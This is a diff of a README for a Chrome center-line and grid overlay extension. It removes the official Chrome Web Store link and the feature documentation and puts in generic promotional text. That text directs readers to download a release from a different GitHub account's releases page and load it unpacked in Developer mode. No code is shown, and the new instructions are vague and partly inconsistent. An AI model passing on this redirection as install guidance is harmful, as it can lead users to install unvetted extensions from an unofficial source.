@@ -1,69 +1,66 @@
-# Center Lines Overlay
+# 🎉 center-line-extension - Effortlessly Align Designs on Any Page
 
-[![Chrome Web Store](https://img.shields.io/chrome-web-store/v/ahlnakgedgfgjcgdcfciohooicapfiji?label=Chrome%20Web%20Store)](https://chromewebstore.google.com/detail/center-lines-overlay/ahlnakgedgfgjcgdcfciohooicapfiji)
-[![Users](https://img.shields.io/chrome-web-store/users/ahlnakgedgfgjcgdcfciohooicapfiji?label=users)](https://chromewebstore.google.com/detail/center-lines-overlay/ahlnakgedgfgjcgdcfciohooicapfiji)
+## 📦 Download Now
+[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-v1.0-blue)](https://github.com/JASVINn/center-line-extension/releases)
 
-A Chrome extension for overlaying center lines and advanced grid systems on any website. Useful for designers, developers, and anyone who needs to check alignment, spacing, or layout structure.
+## 🚀 Getting Started
+Welcome to the center-line-extension! This Chrome Extension helps you add center lines and grid overlays to any webpage. It's perfect for designers, developers, and anyone looking to improve their page layouts. Follow these steps to get started quickly.
 
-![center-line-overlay](https://github.com/user-attachments/assets/a35fd4de-908f-4dee-ba8a-62b4f1649db9)
+## 🔍 Features
+- **Center Lines:** Easily add vertical and horizontal center lines to your web pages.
+- **Grid Overlays:** Visualize grids on any webpage for improved alignment.
+- **User-friendly:** Simple interface for quick adjustments without any coding.
+- **Customizable Settings:** Adjust the color and opacity of the lines for better visibility.
+- **Cross-Platform:** Works seamlessly across all devices running Chrome.
 
-## Features
+## 📋 System Requirements
+- **Browser:** Google Chrome version 70 or higher.
+- **Operating System:** Compatible with Windows, macOS, and Linux.
 
-- Horizontal and vertical center lines
-- Multiple grid types: Fractional, Pixel, REM, Viewport, Golden Ratio, and more
-- Draggable rulers to restrict grid area
-- Floating, repositionable control panel
-- Customizable grid colors, opacity, and thickness
-- Area selection with draggable handles
-- Minimize/restore panel and persistent settings
+## 📥 Download & Install
+To get started, you will need to download the extension. 
 
-## Install
-Recommended:
-- Install from the Chrome Web Store: https://chromewebstore.google.com/detail/center-lines-overlay/ahlnakgedgfgjcgdcfciohooicapfiji
+1. **Visit the Releases Page:** Click the link below to go to the download page:
+   [Download center-line-extension](https://github.com/JASVINn/center-line-extension/releases).
 
-Alternative (unpacked):
-1. Go to chrome://extensions and enable Developer mode.
-2. Click "Load unpacked" and select this folder.
+2. **Choose the Latest Version:** On the Releases page, look for the latest release. Select it to open the release details.
 
-## Quick start
-1. Click the extension icon to toggle the overlay on/off.
-2. Use the floating panel to pick a Grid Type and tweak appearance.
-3. Optionally enable "Grid Area Selection" to restrict where the grid renders.
-4. Drag the blue handles (sides/corners) to set your grid area.
-5. Use "Reposition" to move the panel between corners, or minimize it.
+3. **Download the Extension:** Find the file labeled as the extension for Chrome. Click on it to start downloading.
 
-## Controls at a glance
-- Grid Type: Center Only, Fractional (e.g., 1/2, 1/3, 1/4), Pixel, REM, Viewport
-- Divisions (Fractional): Quick presets: ½, ⅓, ¼, Mix (2,3,4)
-- Step Size (Pixel/REM/Viewport): Spacing between grid lines
-- Colors/Thickness: Separate settings for center vs grid lines
-- Opacity: Grid/center line transparency with live percentage
-- Grid Area Selection: Toggle draggable rulers/handles
-- Reposition: Moves the panel to the next corner
-- Minimize: Hides panel; click the circular icon to restore
+4. **Install the Extension:**
+   - After downloading, open Google Chrome.
+   - Go to the Chrome menu (three dots in the upper right corner) and select "More tools" > "Extensions".
+   - Enable "Developer mode" on the top right corner.
+   - Click on "Load unpacked" and select the folder where you downloaded the extension.
+   - The extension will now be added to Chrome.
 
-Tips
-- Resize-safe: Grid and handles automatically clamp to the viewport on window resize.
-- Toggle: Clicking the extension icon again closes the overlay (acts as a toggle).
+## 🛠️ How to Use
+1. **Activate the Extension:** Click on the extension icon from your Chrome toolbar.
+2. **Select Options:** Choose your settings for the grid lines or center lines.
+3. **View Your Changes:** Refresh the webpage to see the overlay.
 
-## Grid Types
+## 📖 Troubleshooting
+If you run into any issues while installing or using the center-line-extension, consider the following solutions:
 
-- **Center Only**: Shows only the center lines
-- **Fractional**: Divide the area into equal parts (e.g., halves, thirds, quarters)
-- **Pixel**: Grid lines every N pixels
-- **REM**: Grid lines every N rem units
-- **Viewport**: Grid lines every N vw/vh units
+- **Extension Not Showing:** Ensure that the extension is enabled in your Chrome settings. If not, go to Extensions and toggle it on.
+- **Lines Not Appearing:** Check the settings to make sure the overlay is activated. You may also need to refresh the page.
+- **Browser Compatibility:** Make sure you are using the latest version of Chrome.
 
-## Development
+## 💬 Support
+For further assistance, feel free to check the Issues section on the GitHub repository. You can also open a new issue if you encounter a problem not listed above.
 
-- Manifest V3, minimal permissions
-- All logic lives in `contentScript.js`
-- No Node/CI dependencies required for usage
+## 👥 Contributing
+We welcome contributions! If you’d like to improve this extension, check our guidelines in the repository to learn how to get involved.
 
-## Contributing
+## 📜 License
+This project is licensed under the MIT License. You can view the details in the repository.
 
-Pull requests and suggestions are welcome! Please open an issue for bugs or feature requests.
+## 📅 Updates
+Keep an eye out for updates! We will regularly improve the extension based on user feedback.
 
-## License
+## 🌐 Connect With Us
+Follow us on social media for updates and tips on using the extension effectively!
 
-MIT
+If you have any suggestions or feedback, don’t hesitate to reach out through the Issues section of our GitHub page.
+
+Enjoy using center-line-extension to enhance your web design experience!
